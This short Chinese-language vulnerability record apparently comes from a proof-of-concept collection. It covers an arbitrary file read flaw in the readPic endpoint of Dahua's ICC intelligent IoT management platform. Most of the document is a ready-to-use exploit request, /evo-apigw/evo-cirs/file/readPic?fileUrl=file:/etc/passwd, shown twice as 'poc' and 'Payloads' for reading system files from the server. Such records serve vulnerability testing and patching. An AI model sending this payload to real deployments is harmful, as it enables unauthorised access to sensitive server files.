# 大华 ICC智能物联综合管理平台 readPic 任意文件读取漏洞

## 漏洞描述
大化 ICC智能物联综合管理平台 readPic 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登陆页面

![image-20231116141833821](images/image-20231116141833821.png)

poc

```
/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
```


## Payloads
```
/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
```
